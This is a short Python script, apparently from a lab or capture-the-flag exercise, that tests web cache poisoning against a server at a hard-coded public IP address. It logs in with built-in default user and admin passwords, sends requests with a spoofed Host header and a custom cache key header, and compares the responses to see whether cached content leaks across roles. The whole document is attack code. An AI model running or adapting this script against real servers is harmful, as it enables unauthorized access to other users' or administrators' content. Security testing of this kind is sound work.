import requests
import time
import json

SERVER_URL = "http://54.198.62.41"

def login_user(username, password):
    """Login and get JWT token"""
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def test_cache_poison():
    # Get user token
    user_token = login_user("user", "user123")
    print(f"\nUser token obtained: {user_token[:20]}...")

    # Try caching with explicit path in header
    print("\nAttempting cache poison with explicit path...")
    headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Host': 'localhost',
        'Accept': 'application/json'
    }
    
    # First request to cache
    cache_resp = requests.get(
        f"{SERVER_URL}/api/blog/post/1", 
        headers=headers
    )
    print("\nCache attempt response:")
    print(f"Status: {cache_resp.status_code}")
    print(f"Headers:\n{json.dumps(dict(cache_resp.headers), indent=2)}")
    print(f"Content preview: {cache_resp.text[:200]}")
    
    # Wait a moment
    print("\nWaiting 2 seconds...")
    time.sleep(2)
    
    # Try admin access
    admin_token = login_user("admin", "admin123")
    headers = {
        'Authorization': f'Bearer {admin_token}',
        'X-Special-Key': 'secret_cache_key',
        'Host': 'localhost',
        'Accept': 'application/json'
    }
    
    print("\nTrying admin access to cached content...")
    admin_resp = requests.get(
        f"{SERVER_URL}/api/blog/post/1", 
        headers=headers
    )
    print(f"\nAdmin response:")
    print(f"Status: {admin_resp.status_code}")
    print(f"Headers:\n{json.dumps(dict(admin_resp.headers), indent=2)}")
    print(f"Content preview: {admin_resp.text[:200]}")

    # Compare responses
    print("\nResponse comparison:")
    print(f"Same content: {cache_resp.text == admin_resp.text}")
    print(f"Cache headers match: {cache_resp.headers.get('Cache-Control') == admin_resp.headers.get('Cache-Control')}")

if __name__ == "__main__":
    print("Starting modified cache test...")
    test_cache_poison()